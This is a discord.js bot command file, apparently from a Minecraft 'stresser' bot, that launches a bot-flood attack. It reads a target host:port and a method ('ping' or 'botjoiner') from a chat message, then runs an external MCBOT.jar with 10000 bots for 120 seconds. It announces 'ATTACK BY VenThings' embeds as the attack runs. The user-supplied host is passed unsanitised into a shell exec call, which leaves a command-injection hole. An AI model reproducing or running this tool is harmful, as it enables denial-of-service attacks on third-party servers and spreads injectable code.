const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]


const method = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('mcbot(edited by VenThings)')
	.setDescription("`example .mcbot 1.1.1.1:25565 ping/botjoiner`")
	.setFooter(":D Created By VenThings")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -jar MCBOT.jar ${host} 754 ${method} 120 10000`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ATTACK BY VenThings** 🚀')
	.setTimestamp()
	.setDescription("**► attack done 💥**")
	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ATTACK BY VenThings** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `" + method + "` \n **𝐓𝐢𝐦𝐞**: `120`")	
  .setFooter('© Developer: VenThings#3280', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['mcbot'],
  permLevel: 0
}

exports.help = {
  name: 'mcbot',
  description: 'VenThings',
  usage: 'mcbot'
}